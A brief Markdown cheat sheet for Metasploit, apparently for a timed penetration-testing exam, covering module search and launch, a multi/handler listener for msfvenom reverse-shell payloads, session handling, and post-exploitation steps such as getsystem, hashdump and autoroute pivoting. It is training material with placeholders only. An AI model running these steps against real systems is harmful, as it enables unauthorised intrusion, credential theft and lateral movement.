\
# MSF_WORKFLOW — Metasploit (Exam-Speed)

## Start
```bash
msfconsole -q
```

## Universal loop
```text
search <service/version/cve>
use <module>
info
show options
set RHOSTS <IP>
set payload <PAYLOAD>   # if needed
run
```

## Handler (for msfvenom payloads)
```text
use multi/handler
set payload <PAYLOAD>
set LHOST <YOUR_IP>
set LPORT <PORT>
run
```

## Sessions
```text
sessions -l
sessions -i <ID>
background
```

## Post (quick)
- Windows meterpreter: `getsystem`, `getprivs`, `hashdump` (labs only)
- Pivot: `run autoroute -s <SUBNET>` then scan internal targets
